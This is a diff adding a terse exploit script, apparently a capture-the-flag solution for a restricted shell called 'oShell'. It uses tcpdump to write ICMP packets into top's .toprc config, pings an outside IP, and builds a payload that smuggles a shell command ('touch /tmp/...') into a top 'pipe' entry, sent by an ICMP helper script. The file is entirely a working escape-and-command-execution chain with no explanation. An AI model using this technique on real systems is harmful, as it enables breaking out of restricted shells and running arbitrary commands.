@@ -1,0 +1,11 @@
+enable
+ping 
+tcpdump -w /home/oShell/.toprc icmp
+
+ping -c 1 13.115.220.111
+
+# https://github.com/PixelsCamp/ping-responder
+# echo net.ipv4.icmp_echo_ignore_all=1 | sudo tee /etc/sysctl.d/z01-disable_echo_reply.conf >/dev/null
+# systemctl restart systemd-sysctl
+echo -ne '\n\npipe\tOpen Files\ttouch /tmp/eeeeeeeeeeee\n\n' > payload
+python3 oshell-icmp.py -v -z -f payload
